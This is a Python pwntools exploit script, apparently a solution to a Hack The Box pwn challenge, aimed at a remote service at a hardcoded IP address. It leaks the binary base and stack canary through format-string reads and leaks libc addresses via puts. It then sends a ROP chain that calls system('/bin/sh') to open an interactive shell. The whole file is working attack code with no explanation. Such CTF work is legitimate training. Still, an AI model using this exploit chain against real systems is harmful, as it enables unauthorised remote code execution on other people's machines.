import ipaddress
import pathlib

from pwnlib import gdb

from core.target_config import Mode, Config
from core.targetbase import TargetBase
from custom.f_say import WhatDoesTheFSayPwn
from modules.format_string_magic import FormatStringMagicRead
from loguru import logger
from pwn import p64

from modules.get_libc_address import GetLibcAddress

if __name__ == '__main__':
    remote_config = Config(
        rop=True,
        mode=Mode.remote,
        ip=ipaddress.IPv4Address('134.209.24.67'),
        port=30248,
        file=pathlib.Path('/home/lim8en1/htb/projects/fsay/what_does_the_f_say'),
        offset=0x18,
        detect_libc=True,
        main_function_name='_start',
        illegal_symbols=b' \t\n'
    )

    def check(variable, name):
        assert b'\x20' not in p64(variable), f"illegal symbol in {name}"
        assert b'\t' not in p64(variable), f"illegal symbol in {name}"
        assert b'\n' not in p64(variable), f"illegal symbol in {name}"
        assert b'\r' not in p64(variable), f"illegal symbol in {name}"

    t = TargetBase(pwn_target=WhatDoesTheFSayPwn, config=remote_config)
    # _, debugger = gdb.attach(t.process.pid, api=True)
    # debugger.execute('break *warning + 95')
    # debugger.execute('break *warning + 74')
    # # debugger.execute('break system')
    # debugger.execute('c')
    payload = b"2 3 2 3 2 3 2 3 2 3"
    response = t.process.sendline(payload)
    t.process.clean(0.5)

    fox_bar_ptr = FormatStringMagicRead.execute(t, position=15) - 106
    t.file.address = fox_bar_ptr - t.file.symbols['fox_bar']

    pop_rdi_gadget = t.rop.find_gadget(['pop rdi', 'ret']).address + t.file.address
    logger.success(f"pop_rdi_gadget@{hex(pop_rdi_gadget)}")
    check(pop_rdi_gadget, 'pop_rdi_gadget')

    pop_rsi_gadget = t.rop.find_gadget(['pop rsi', 'pop r15', 'ret']).address + t.file.address
    logger.success(f"pop_rsi_gadget@{hex(pop_rsi_gadget)}")
    check(pop_rsi_gadget, 'pop_rsi_gadget')

    cookie = FormatStringMagicRead.execute(t, position=13)
    check(cookie, 'cookie')
    t.canary = cookie
    logger.success(f"cookie: {hex(cookie)}")

    def handler(target: TargetBase, payload: bytes):
        target.run_main(b'\0')
        print(t.process.recvline().decode())
        t.process.send_raw(payload + b'\n')
    t.leave = True
    read_address = GetLibcAddress.execute(t, target_functions=['exit'],
                           print_function='puts', handler=handler)
    t.process.clean(0.3)
    printf_address = GetLibcAddress.execute(t, target_functions=['puts'],
                           print_function='puts', handler=handler)
    GetLibcAddress.libc_update_base_address(t, functions=[('exit', read_address), ('puts', printf_address)])
    # GetLibcAddress.libc_update_base_address(t, functions=[('exit', read_address)])
    system_ptr = t.libc.symbols['system']
    check(system_ptr, 'system_ptr')
    exit_ptr = t.libc.symbols['exit']
    check(exit_ptr, 'exit')

    string_address = FormatStringMagicRead.execute(t, position=1)
    check(string_address, 'string_address')
    logger.success(f"string_address@{hex(string_address)}")
    print(t.process.recvline().decode())
    t.process.sendline(b'\0')
    payload = t.create_payload(
            p64(pop_rdi_gadget) +
            p64(string_address - 0x40 + 0x38 + 0x28) +
            p64(pop_rsi_gadget) +
            p64(0x0) +
            p64(0x0) +
            p64(system_ptr) +
            p64(exit_ptr) +
            b'/bin/sh\0'
    )
    print(payload)
    handler(t, payload)
    t.process.interactive()




